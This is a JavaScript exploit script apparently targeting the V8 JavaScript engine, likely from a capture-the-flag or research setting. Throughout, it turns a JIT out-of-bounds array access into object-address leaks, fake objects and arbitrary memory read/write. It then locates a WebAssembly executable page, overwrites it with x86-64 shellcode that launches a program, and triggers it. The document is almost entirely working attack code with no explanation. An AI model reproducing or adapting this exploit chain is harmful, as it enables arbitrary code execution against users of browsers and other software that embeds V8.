var buff = new ArrayBuffer(0x10);
var int_ = new Uint32Array(buff);
var flo_ = new Float64Array(buff);

function itof(data){
	var data1 = data / 0x100000000;
	var data2 = data & 0xffffffff;
	int_[0] = data2;
	int_[1] = data1;
	return flo_[0];
}

function ftoi(data){
	flo_[0] = data;
	return int_[1]*0x100000000 + int_[0];
}

function itos(argument) {
	return '0x'+argument.toString(16);
}

function gc(){
	for (var i = 0; i < 0x1000; i++) {
		new String(1024*1024/10);
	}
}

function opt_me() {
	double_array = [1,2,3,4.1]; //can not be sim element
	var idx = 4;
	idx = idx & 0xff;
	return double_array[idx];
}

for (var i = 0; i < 100000; i++) {
	opt_me();
}

// all in int type
gc();
/*  obj map test case
var obj = {x:1};
var test = [obj];
*/
var double_map = ftoi(opt_me());
var obj_map = double_map + 160;
print('[*] get the obj_map and double_map');

global_array = [];

function fake_obj_primi(addr) {
    var a = [itof(addr), itof(addr), itof(addr), 1.1];  //the addr should be in float type
    var idx = 4;
    idx = idx & 0xff;
    a[idx] = itof(obj_map);
    return a;
}

function fake_obj(addr) {
    for(var i = 0; i < 0x10000; i++) {
        var data = fake_obj_primi(addr);
    }
    return data[0];
}

function leak_obj_primi(){
	var a = [itof(double_map),itof(double_map),itof(double_map),1.1];
	//%DebugPrint(a);
	var idx = 4;
	idx = idx & 0xff;
	a[idx] = itof(obj_map);
	return a;                 //can not be a[0];
}

function leak_obj_opt(){
	for (var i = 0; i < 0x10000; i++) {
		var data = leak_obj_primi();
	}
	//%DebugPrint(data);
	global_array.push(data[0]);
}

leak_obj_opt();
double_map_obj = global_array.pop();
print('[*] get the double map object');

function leak_obj_primi2(obj){
	//leak_obj_opt();                        -| these can not be in this function
	//double_map_obj = global_array.pop();   -| otherwise will be in a while

	//%DebugPrint(double_map_obj);
	var data2 = {x:1};
	var a = [obj,data2,data2,data2];
	//%DebugPrint(a);
	var idx = 4;
	idx = idx & 0xff;
	a[idx] = double_map_obj;
	return a;
}

function leak_obj(obj){
	for (var i = 0; i < 10000; i++) {
		var data = leak_obj_primi2(obj);
	}
	//%DebugPrint(data);
	return ftoi(data[0]);
}

var array_test = [itof(double_map),1.1,1,0xffffffff];
var buff_test = new ArrayBuffer(0x100);

function write_(write_addr,write_data){
	var test_addr = leak_obj(array_test);
	//print('array addr : '+itos(test_addr));
	//%SystemBreak();
	array_test[2] = itof(write_addr - 0x10);
	//%SystemBreak();
	var modify_obj_addr = test_addr + 0x598;
	//print(itos(modify_obj_addr));
	var modify_obj = fake_obj(modify_obj_addr);
	//print(itos(write_addr));
	//%DebugPrint(modify_obj);
	//%SystemBreak();
	modify_obj[0] = itof(write_data);
}

function read_(read_addr){
	var test_addr = leak_obj(array_test);
	//print(itos(test_addr));
	//%SystemBreak();
	array_test[2] = itof(read_addr - 0x10);
	//%SystemBreak();
	var modify_obj_addr = test_addr + 0x598;  // the array's FixedArray is not stable
	var modify_obj = fake_obj(modify_obj_addr);
	//print(itos(write_addr));
	//%DebugPrint(modify_obj);
	//%SystemBreak();
	return ftoi(modify_obj[0]);
}

//var v1nke = [1,1,1,1.1];
//print(itos(leak_obj(v1nke)));

/*
var test = [1,1,1,1];
var test_aaa = leak_obj(test);
print(itos(test_aaa));
print(itos(read_(test_aaa)));
*/

//start wasm exploit


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;
var f_addr = leak_obj(f);

var f_rwx1 = read_(f_addr+0x18); //shared_info
var f_rwx2 = read_(f_rwx1+0x8);  //WasmExportedFunctionData
var f_rwx3 = read_(f_rwx2+0x10); //instance
var rwx_addr = read_(f_rwx3+0x80); //rwx_part

print('[*] get the rwx area :'+itos(rwx_addr));

var buff_addr = leak_obj(buff_test);
write_(buff_addr+0x20,rwx_addr);

print('[*] start to write shellcode');

//%SystemBreak();
var dataview = new DataView(buff_test,0);

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

for (var i = 0; i < shellcode.length; i++) {
	dataview.setUint32(i*4,shellcode[i],true);
}

print('[*] trigger!');

f();

//%SystemBreak();
